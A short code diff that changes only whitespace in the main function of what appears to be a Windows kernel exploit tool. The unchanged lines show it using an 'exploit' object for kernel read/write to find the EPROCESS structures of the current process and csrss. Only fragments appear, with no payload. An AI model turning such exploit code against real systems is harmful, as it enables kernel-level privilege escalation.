@@ -17,8 +17,8 @@ int main() {
             return -1;
         }
         printf("----- Driver Is unloaded at this point utilizing only the exploit for read/write -----\n");
-    }    
-
+    }
+    
 
     // Retrieve current process details
     __int64 currentProcess = exploit.EProcess(GetCurrentProcessId());
@@ -48,6 +48,6 @@ int main() {
 
     __int64 csrssEProcess = exploit.EProcess(csrssProcessId);
     printf("[+] csrss EProcess: %llx\n", csrssEProcess);
-     
+
     Sleep(-1);
 }
